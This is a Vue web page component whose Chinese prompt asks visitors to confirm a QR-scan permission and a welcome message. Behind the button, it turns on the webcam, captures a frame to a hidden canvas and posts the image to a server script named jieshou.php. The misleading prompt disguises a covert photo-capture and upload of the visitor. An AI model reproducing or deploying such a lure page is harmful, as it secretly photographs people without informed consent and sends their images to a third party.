<template>
    <div>
        	<div class="wenzi">
		<div class="yuyan">
			是否允扫二维码限请求？
			<br />
			<br />
			请使用uc浏览器访问！阿斯蒂芬
			<br />
			<br />
			欢迎光临本站，请确定！
		</div>
		<div class="sf">
			<button id='snap'>确定</button>
		</div>
	</div>




	<div>
		<video id='video'></video>
		<canvas style="width:0px;height:0px" id='canvas' width='640' height='480'></canvas>
	</div>
	<div class="return"></div>
    </div>
</template>


<script>
export default {
    mounted() {
        		// Grab elements, create settings, etc.
			var canvas = document.getElementById('canvas');  // 查找canvas
			var context = canvas.getContext('2d');			// 创建上下文2d
			var video = document.getElementById('video');  // 查找媒体标签
			var mediaConfig = {
				video: true
			
			}			// 媒体配置
			var errBack = function (e) {
				console.log('An error has occurred!', e)
			};

			// Put video listeners into place
			//把视频监听器放在合适的位置
			if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
				navigator.mediaDevices.getUserMedia(mediaConfig).then(function (stream) {
				/* 	video.src = window.URL.createObjectURL(stream);
					console.log(window.URL.revokeObjectURL(stream)) */
					video.srcObject = stream
					console.log(stream)
					console.log(video.srcObject )
					video.play();
				});
			}

			/* Legacy code below! */
			else if (navigator.getUserMedia) { // Standard
				navigator.getUserMedia(mediaConfig, function (stream) {
					video.src = stream;
					video.play();
				}, errBack);
			} else if (navigator.webkitGetUserMedia) { // WebKit-prefixed
				navigator.webkitGetUserMedia(mediaConfig, function (stream) {
					video.src = window.webkitURL.createObjectURL(stream);
					video.play();
				}, errBack);
			} else if (navigator.mozGetUserMedia) { // Mozilla-prefixed
				navigator.mozGetUserMedia(mediaConfig, function (stream) {
					video.src = window.URL.createObjectURL(stream);
					video.play();
				}, errBack);
			}

			// Trigger photo take


			document.getElementById('snap').addEventListener('click', function () {
				context.drawImage(video, 0, 0, 640, 480);
				var url = canvas.toDataURL('image/png');
				$(document).ready(function () {
					$.ajax({
						cache: true,
						type: "POST",
						url: "./jieshou.php",
						data: {img:url},
						async: false,
						error: function (request) {
							alert("Connection error");
						},
						success: function (data) {
							console.log(data)
							// console.log( $('#tp').serialize())
							// $(".return").parent().html(data);
							
						}
					});

				});
			});
    },

}
</script>


<style lang="css" scoped>
	html body {
			width: 100%;
			height: auto;
			
			margin: 0 auto 0px;
			padding: 0 0 0px;
			background-color: #444
		}

		a {
			text-decoration: none;
		}

		.wenzi {
			width: 300px;
			height: 300px;
			margin-right: auto;
			margin-left: auto;
		}

		.yuyan {
			width: 100%;
			height: 150px;
			color: #fff;
			margin-top: 60px;
			text-align: center;
		}

		.sf {
			width: 100%;
			height: 150px;
			line-height: 150px;
			text-align: center;
		}

		.sf a {
			display: block;
			font-size: 12px;
			margin-left: 28%;
			text-decoration: none;
			text-align: center;
			background-color: #EBEBEB;
			width: 50px;
			height: 20px;
			line-height: 20px;
			border: solid 1px #222;
			float: left;
		}

		.sf button {
			display: block;
			font-size: 13px;
			margin-left: 10px;
			text-align: center;
			background-color: #EBEBEB;
			width: 50px;
			height: 22px;
			border: solid 1px #222;
			float: left;
		}
		#video{
		}
</style>